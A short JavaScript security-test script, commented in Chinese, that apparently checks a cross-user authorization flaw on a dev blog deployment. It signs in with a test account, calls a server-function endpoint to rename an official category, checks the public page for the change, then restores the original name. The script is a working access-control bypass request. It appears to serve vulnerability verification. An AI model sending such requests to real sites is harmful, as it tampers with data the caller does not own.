// 跨用户越权确证:用测试账号 rename 官方分类,以公开页面观测是否真实生效
import { Torchwood } from '@torchwood/sdk'
import { toJSONAsync } from 'seroval'

const BASE = 'https://torchwood-blog-dev.deeploop.run'
const GATEWAY = 'https://torchwood-dev.deeploop.run'
const EMAIL = process.env.SEC_TEST_EMAIL
const PASSWORD = process.env.SEC_TEST_PASSWORD
const RENAME_ID = 'ce1b3447b04400a77ea5c087da3fa4cb41e9074878c626b75a88dbed54b85d8d'

const tw = Torchwood.create({ endpoint: GATEWAY, projectId: 'blog' })
const r = await tw.account.signIn({ email: EMAIL, password: PASSWORD })

async function rename(name) {
  const payload = JSON.stringify(await toJSONAsync({ data: { categoryId: 'cat-tech', name } }))
  return fetch(`${BASE}/_serverFn/${RENAME_ID}`, {
    method: 'POST',
    headers: {
      'content-type': 'application/json',
      'x-tsr-serverFn': 'true',
      'sec-fetch-site': 'same-origin',
      authorization: `Bearer ${r.tokens.access_token}`,
    },
    body: payload,
  }).then((x) => x.status)
}

async function categoriesOnPage() {
  const html = await fetch(`${BASE}/`).then((x) => x.text())
  return {
    hasTech: html.includes('>技术<'),
    hasRescan: html.includes('>RESCAN-XUSER<'),
  }
}

console.log('rename->RESCAN-XUSER http', await rename('RESCAN-XUSER'))
await new Promise((res) => setTimeout(res, 800))
const during = await categoriesOnPage()
console.log('改名后页面状态:', JSON.stringify(during))
console.log('=> 跨用户改名真实生效:', during.hasRescan ? '是(越权写仍放行,登录即全权)' : '否(被所有权/权限拦截)')

console.log('restore->技术 http', await rename('技术'))
await new Promise((res) => setTimeout(res, 800))
const after = await categoriesOnPage()
console.log('恢复后页面状态:', JSON.stringify(after))
